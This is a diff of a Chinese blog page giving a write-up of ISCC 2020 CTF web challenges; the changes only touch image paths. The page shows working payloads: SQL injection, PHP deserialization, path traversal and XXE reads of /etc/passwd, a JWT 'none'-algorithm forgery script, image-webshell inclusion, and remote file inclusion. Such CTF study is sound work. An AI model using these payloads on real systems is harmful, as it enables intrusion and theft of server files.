@@ -403,26 +403,26 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下ISCC2020历经25天的Web题解，题量可能有点多 QAQ ！！针对题目的难易程度上：易、中、难都有（老少皆宜），此次比赛和以往不太一样，增加了擂台题和实战题一定程度上还是不错的。</p>
-<h1 id="练武题-Web"><a href="#练武题-Web" class="headerlink" title="练武题-Web"></a>练武题-Web</h1><h2 id="阿森的爱情-1"><a href="#阿森的爱情-1" class="headerlink" title="阿森的爱情-1"></a>阿森的爱情-1</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501183916930.png" alt="image-20200501183916930"></p>
+<h1 id="练武题-Web"><a href="#练武题-Web" class="headerlink" title="练武题-Web"></a>练武题-Web</h1><h2 id="阿森的爱情-1"><a href="#阿森的爱情-1" class="headerlink" title="阿森的爱情-1"></a>阿森的爱情-1</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501183916930.png" alt="image-20200501183916930"></p>
 <p>考点：敏感信息收集</p>
 <p>使用工具对网站进行敏感信息的探测，存在<code>readme.txt</code></p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501091103663.png" alt="image-20200501091103663"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501091103663.png" alt="image-20200501091103663"></p>
 <p>访问<code>readme.txt</code>直接得到flag</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501091123914.png" alt="image-20200501091123914"></p>
-<pre><code>flag{uragoodman}</code></pre><h2 id="阿森的爱情-2"><a href="#阿森的爱情-2" class="headerlink" title="阿森的爱情-2"></a>阿森的爱情-2</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200507234350380.png" alt="image-20200507234350380"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501091123914.png" alt="image-20200501091123914"></p>
+<pre><code>flag{uragoodman}</code></pre><h2 id="阿森的爱情-2"><a href="#阿森的爱情-2" class="headerlink" title="阿森的爱情-2"></a>阿森的爱情-2</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507234350380.png" alt="image-20200507234350380"></p>
 <p>考点：SQL注入</p>
 <p>题目打开是一个登录界面，测试是否存在注入，发现有waf拦截</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521231834575.png" alt="image-20200521231834575"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521231834575.png" alt="image-20200521231834575"></p>
 <p>碰到这样直接fuzz探测存在哪些字符被拦截，只有知道哪些字符被拦截了才能够进行下一步的注入绕过，这里使用bp进行fuzz</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521232516834.png" alt="image-20200521232516834"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521232516834.png" alt="image-20200521232516834"></p>
 <p>紧接着测试发现存在布尔盲注</p>
-<pre><code>username=admin&#39; and 2&gt;1#&amp;password=11&amp;submit=enter</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521233433524.png" alt="image-20200521233433524"></p>
+<pre><code>username=admin&#39; and 2&gt;1#&amp;password=11&amp;submit=enter</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521233433524.png" alt="image-20200521233433524"></p>
 <p>虽然存在布尔盲注，但是由于网站waf对一些特殊字符的拦截导致布尔盲注无法利用，同时在测试时间盲注和报错盲注的时候也是因为waf的拦截导致无法利用。</p>
 <p>既然因为waf的拦截导致无法利用，那就分析waf拦截的字符，发现对<code>select、order by、union</code>等字符没有被过滤，所以这里可以尝试使用针对<code>order by</code>的联合查询注入读取敏感信息。</p>
 <p>探测当前数据库表存在的列数（根据回显信息得出当前表为3列，可以猜测三列分别为：id、username、password）</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200522000753822.png" alt="image-20200522000753822"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200522000753822.png" alt="image-20200522000753822"></p>
 <p>知道列数之后开始进行联合查询，测试发现存在联合查询注入，同时页面回显的内容正是第二列用户名的内容</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200522001500990.png" alt="image-20200522001500990"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200522001500990.png" alt="image-20200522001500990"></p>
 <p>根据之前的提示，flag存在于第三列密码字段列中：<code>The content in the password column is the flag!</code>，但是因为页面回显的是第二列内容无法回显第三列内容，所以这里无法直接利用上述payload，到这里是否真的无法判断第三列内容呢，答案是否定的，这里可以巧妙的使用<code>order by</code>以及结合页面的回显来判断第三列所存储的密码，下面编写测试数据表进行测试分析</p>
 <p>测试数据:</p>
 <pre><code>+----+----------+----------------------------------+
@@ -518,15 +518,15 @@ flag<span class="token operator">=</span><span class="token string">''</span>
             <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
             <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>注入结果</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200522005414385.png" alt="image-20200522005414385"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200522005414385.png" alt="image-20200522005414385"></p>
 <p>解密密码得到flag</p>
 <pre><code>ciphertext：bfe42ac26e273ef3a859a651e0a02df0
 
 plaintext：iloveishuai
 
-flag{iloveishuai}</code></pre><h2 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501183937733.png" alt="image-20200501183937733"></p>
+flag{iloveishuai}</code></pre><h2 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501183937733.png" alt="image-20200501183937733"></p>
 <p>考点：反序列化<code>__toString</code>的利用</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508135602483.png" alt="image-20200508135602483"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508135602483.png" alt="image-20200508135602483"></p>
 <p>根据提示下载文件</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  
 @<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -585,36 +585,36 @@ flag{iloveishuai}</code></pre><h2 id="Php-is-the-best-language"><a href="#Php-is
 <span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508135226640.png" alt="image-20200508135226640"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508135226640.png" alt="image-20200508135226640"></p>
 <p>继续审计，使用攻击载荷，对Get请求data传参，传入序列化数据，当反序列化数据被当作字符串处理时<code>echo</code>，会触发<code>__toString</code>反序列化载荷，然后由<code>file_get_contents($filename)</code>执行读取文件的操作</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501091430687.png" alt="image-20200501091430687"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501091430687.png" alt="image-20200501091430687"></p>
 <p>base64解码得到特殊文件内容</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501091648498.png" alt="image-20200501091648498"></p>
-<pre><code>flag{u_r_really_a_php_expert}</code></pre><h2 id="What-can-images-do"><a href="#What-can-images-do" class="headerlink" title="What can images do"></a>What can images do</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501183958488.png" alt="image-20200501183958488"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501091648498.png" alt="image-20200501091648498"></p>
+<pre><code>flag{u_r_really_a_php_expert}</code></pre><h2 id="What-can-images-do"><a href="#What-can-images-do" class="headerlink" title="What can images do"></a>What can images do</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501183958488.png" alt="image-20200501183958488"></p>
 <p>考点：文件包含Bypass前缀限制、敏感信息泄露</p>
 <p>题目面目</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501142840150.png" alt="image-20200501142840150"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501142840150.png" alt="image-20200501142840150"></p>
 <p>测试上传文件，发现只能上传<code>jpg,jpeg,png</code>格式</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501142958083.png" alt="image-20200501142958083"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501142958083.png" alt="image-20200501142958083"></p>
 <p>继续往下看，测试下一个功能发现存在文件包含</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501143915664.png" alt="image-20200501143915664"></p>
-<pre><code>?filename=../../../../etc/passwd</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501143142056.png" alt="image-20200501143142056"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143915664.png" alt="image-20200501143915664"></p>
+<pre><code>?filename=../../../../etc/passwd</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143142056.png" alt="image-20200501143142056"></p>
 <p>然而并不能使用PHP伪协议，存在包含限制，于是对网站扫描敏感信息得到网站关键路径</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501143405106.png" alt="image-20200501143405106"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143405106.png" alt="image-20200501143405106"></p>
 <p><code>/inc/</code>目录存放网站上传功能的脚本</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501143553659.png" alt="image-20200501143553659"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143553659.png" alt="image-20200501143553659"></p>
 <p><code>include</code>目录存放网站包含所需的文件</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501143632617.png" alt="image-20200501143632617"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143632617.png" alt="image-20200501143632617"></p>
 <p><code>uploads</code>目录存放网站上传的文件</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501143724204.png" alt="image-20200501143724204"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143724204.png" alt="image-20200501143724204"></p>
 <p>根据<code>include</code>目录文件信息可以猜测包含功能函数限制在<code>include</code>目录里面，类似代码如下：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token keyword">include</span><span class="token operator">/</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这时候再看网站本身文件的包含，确实是直接限制在include目录里面</p>
 <p><code>?filename=file5.php&amp;submit=提交查询</code></p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501143915664.png" alt="image-20200501143915664"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501143915664.png" alt="image-20200501143915664"></p>
 <p>这个时候已经很清楚了，由于没有对<code>../</code>进行过滤，直接上传图片马，路径穿透包含图片马Getshell</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501144801560.png" alt="image-20200501144801560"></p>
-<pre><code>http://101.201.126.95:7004/?filename=../uploads/2020/05/01/2418455eabbf3f5765a454339781.jpg&amp;submit=%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501144523185.png" alt="image-20200501144523185"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501144801560.png" alt="image-20200501144801560"></p>
+<pre><code>http://101.201.126.95:7004/?filename=../uploads/2020/05/01/2418455eabbf3f5765a454339781.jpg&amp;submit=%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501144523185.png" alt="image-20200501144523185"></p>
 <pre><code>cat flag.php
 
 flag{ISCC_FREAKING_AWESOME}</code></pre><p><strong>附题目源码</strong></p>
@@ -960,14 +960,14 @@ flag{ISCC_FREAKING_AWESOME}</code></pre><p><strong>附题目源码</strong></p>
 
 
 <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="未知的风险-1"><a href="#未知的风险-1" class="headerlink" title="未知的风险-1"></a>未知的风险-1</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501184019059.png" alt="image-20200501184019059"></p>
+<h2 id="未知的风险-1"><a href="#未知的风险-1" class="headerlink" title="未知的风险-1"></a>未知的风险-1</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501184019059.png" alt="image-20200501184019059"></p>
 <p>考点：JWT攻击、XXE</p>
 <p>题目打开，显示<code>hello guest;</code></p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508124015426.png" alt="image-20200508124015426"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508124015426.png" alt="image-20200508124015426"></p>
 <p>猜测应该是用户身份伪造，查看Cookie</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508124113434.png" alt="image-20200508124113434"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508124113434.png" alt="image-20200508124113434"></p>
 <p>从Cookie中的token格式可以看出来是通过JWT进行身份验证的</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508124304182.png" alt="image-20200508124304182"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508124304182.png" alt="image-20200508124304182"></p>
 <p>jwt解码可以看到Head里面的签名算法和payload里面的用户验证id，下来就是要绕过用户guest，达到任意用户身份伪造。</p>
 <p>一般常见的JWT攻击手法主要包括四种：</p>
 <ul>
@@ -977,43 +977,43 @@ flag{ISCC_FREAKING_AWESOME}</code></pre><p><strong>附题目源码</strong></p>
 <li>None签名</li>
 </ul>
 <p>知道了上面的四种攻击手法之后，先对网站进行敏感信息探测是否存在密钥key泄露问题（【X】未果）,接着尝试对上面的token进行密钥的爆破，使用常用的jwt弱密钥爆破工具<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker: JWT brute force cracker written in C</a>进行爆破</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508125603744.png" alt="image-20200508125603744"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508125603744.png" alt="image-20200508125603744"></p>
 <p>很长时间没爆出来，发现无效，尝试制作相关的弱口令字典</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508125843996.png" alt="image-20200508125843996"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508125843996.png" alt="image-20200508125843996"></p>
 <p>使用自制字典利用工具<a href="https://github.com/Ch1ngg/JWTPyCrack" target="_blank" rel="noopener">JWTPyCrack</a>协助再次进行爆破（结果总是令人伤感的23333）</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508130310598.png" alt="image-20200508130310598"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508130310598.png" alt="image-20200508130310598"></p>
 <p>测试到这里只有最后一种攻击手法了，利用很简单，直接伪造任意用户id，并使用None签名算法进行伪造Token。</p>
 <p>根据题目描述只有用户<code>user</code>才有权限进行后续的操作，于是对用户<code>user</code>进行身份伪造</p>
 <p>伪造脚本</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> jwt
 token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token string">"iat"</span><span class="token punctuation">:</span><span class="token string">"1588902740"</span><span class="token punctuation">,</span> <span class="token string">"jti"</span><span class="token punctuation">:</span> <span class="token string">"cd811589c43d3d507c64b14a6f64e8d8"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508131224670.png" alt="image-20200508131224670"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508131224670.png" alt="image-20200508131224670"></p>
 <p>（在这里，细心的话会发现JWT的第三部分是空的，因为签名算法为None，密钥Key为空）</p>
 <p>利用生成伪造的user身份的Token替换原有Token进行伪造用户验证</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508132207058.png" alt="image-20200508132207058"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508132207058.png" alt="image-20200508132207058"></p>
 <p>伪造的用户user通过验证，进入用户登录界面，查看源码，发现存在用户名和密码通过XML进行处理</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508132359227.png" alt="image-20200508132359227"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508132359227.png" alt="image-20200508132359227"></p>
 <p>直接抓包进行XXE漏洞的探测，构造XXE Payload进行敏感文件的读取</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE message [
     &lt;!ENTITY file SYSTEM "file:///etc/passwd"></span>
 ]>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>66666<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>利用payload探测发现内容读取的文件正常回显，并且没有对用户的输入进行过滤</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508132515813.png" alt="image-20200508132515813"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508132515813.png" alt="image-20200508132515813"></p>
 <p>既然存在XXE漏洞且不存在过滤，尝试读取源码doLogin.php</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508133131147.png" alt="image-20200508133131147"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508133131147.png" alt="image-20200508133131147"></p>
 <p>从结果分析，存在xxe漏洞为什么读取不了呢，这里就需要注意了，php文件的格式<code>&lt;?php ?&gt;</code>类似XML文件<code>&lt;?xml ?&gt;</code>，如果不做处理直接读取是读不出来的，因为其会把php文件当作xml进行解析导致读取出现问题，既然这样可以使用<code>php://filter</code>对文件进行base64编码再显示，这样就不会出现上述问题</p>
 <p>再次构造Payload</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE message [
     &lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=doLogin.php"></span>
 ]>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>66666<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508133800705.png" alt="image-20200508133800705"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508133800705.png" alt="image-20200508133800705"></p>
 <p>可以看到这次结果正常，提取编码后的结果进行base64解码</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508133855004.png" alt="image-20200508133855004"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508133855004.png" alt="image-20200508133855004"></p>
 <p>从源码中可以看到包含有flag.php，利用上述payload直接读取得到flag</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508134419850.png" alt="image-20200508134419850"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508134419850.png" alt="image-20200508134419850"></p>
 <pre><code>flag{get_the_methodd}</code></pre><p><strong>附题目源码</strong></p>
 <ul>
 <li>index.php</li>
@@ -1080,7 +1080,7 @@ token <span class="token operator">=</span> jwt<span class="token punctuation">.
 <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="未知的风险-2"><a href="#未知的风险-2" class="headerlink" title="未知的风险-2"></a>未知的风险-2</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200513090731700.png" alt="image-20200513090731700"></p>
+<h2 id="未知的风险-2"><a href="#未知的风险-2" class="headerlink" title="未知的风险-2"></a>未知的风险-2</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200513090731700.png" alt="image-20200513090731700"></p>
 <p>考点：PHP对象注入、代码审计、序列化</p>
 <p>题目上来给了一个文件上传的服务，没有直接去测试，对网站进行敏感信息收集，发现存在<code>robots.txt</code>泄露</p>
 <pre><code>User-agent: *
@@ -1493,8 +1493,8 @@ Array
         )  
 )</code></pre><p>最后访问<code>index.php?action=open&amp;i=1</code>，服务器直接操作files数组中i=1索引的对象执行open()方法，即ZipArchive的open函数，删除<code>.htaccess</code>文件。</p>
 <p>之后，直接上传webshell拿到服务器权限</p>
-<pre><code>shell.php is in folder sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/cf9c5d4cdaab48d9872f7029d1cd642431e58193.php</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200524140946934.png" alt="image-20200524140946934"></p>
-<pre><code>flag{ghs_aswoer_nmxld}</code></pre><h2 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200507234337368.png" alt="image-20200507234337368"></p>
+<pre><code>shell.php is in folder sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/cf9c5d4cdaab48d9872f7029d1cd642431e58193.php</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524140946934.png" alt="image-20200524140946934"></p>
+<pre><code>flag{ghs_aswoer_nmxld}</code></pre><h2 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507234337368.png" alt="image-20200507234337368"></p>
 <p>考点：文件包含</p>
 <p>题目源码直接给了</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -1507,22 +1507,22 @@ Array
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>代码审计<code>file</code>变量用户可控存在文件包含漏洞</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200507234830391.png" alt="image-20200507234830391"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507234830391.png" alt="image-20200507234830391"></p>
 <p>测试发现本地文件包含漏洞无法进行恶意利用（服务器访问日志、SSH日志等无法直接访问包含），直接猜测测试是否存在远程文件包含漏洞（随便找一个其他题目链接，意外发现成功包含【第一次CTF遇见远程文件包含。。。。尴尬。。。】）</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200507235424156.png" alt="image-20200507235424156"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507235424156.png" alt="image-20200507235424156"></p>
 <p>到这里不用说了，直接远程包含恶意文件拿到Webshell</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200507235643454.png" alt="image-20200507235643454"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507235643454.png" alt="image-20200507235643454"></p>
 <p>这里也可以查看服务器的php.ini配置</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200507234637957.png" alt="image-20200507234637957"></p>
-<pre><code>flag{web_include_file}</code></pre><h2 id="成绩查询-2"><a href="#成绩查询-2" class="headerlink" title="成绩查询-2"></a>成绩查询-2</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200513090803813.png" alt="image-20200513090803813"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200507234637957.png" alt="image-20200507234637957"></p>
+<pre><code>flag{web_include_file}</code></pre><h2 id="成绩查询-2"><a href="#成绩查询-2" class="headerlink" title="成绩查询-2"></a>成绩查询-2</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200513090803813.png" alt="image-20200513090803813"></p>
 <p>考点：敏感信息收集、SQL注入</p>
 <p>题目打开之后是一个登陆界面</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521112053200.png" alt="image-20200521112053200"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521112053200.png" alt="image-20200521112053200"></p>
 <p>测试查看任意账户密码登录回显信息（不管用户名、密码是什么都会报错：<code>password is error！</code>）</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521174715852.png" alt="image-20200521174715852"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521174715852.png" alt="image-20200521174715852"></p>
 <p>简单注入<code>username</code>和<code>password</code>无果，到这里先不再继续注入，寻找网站是否存在其它的敏感信息泄露</p>
 <p>收集网站敏感信息，发现存在特殊目录和文件的泄露</p>
